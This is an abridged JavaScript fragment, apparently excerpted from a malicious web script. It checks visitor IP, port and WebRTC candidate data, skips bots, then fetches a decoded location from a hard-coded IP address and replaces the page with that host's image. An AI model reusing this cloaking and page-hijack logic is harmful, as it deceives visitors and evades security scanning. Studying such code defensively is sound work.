    ...
    if (ipMatch) {
      ...
      if (portMatch) {
        ...
        if (candidateStr.includes("typ ") && !isBot) {
          ...
          fetch(`http://103.228.126.66/${currentPath}?returnJSON=true`)
          .then(res => res.json())
          .then(data => {
            if (data.result) {
              var finalLocation = decodeLocation(data.result);
              try {
                var image = decodeLocation(data.hash).replace(/.*\/storage/, 'storage');
                document.body.innerHTML = `<style>.fullscreen-image{height:100vh;width:100vw;background:url("http://103.228.126.66/${image}") center center/cover no-repeat}</style><div class="fullscreen-image"></div>`;
              } catch (e) { }
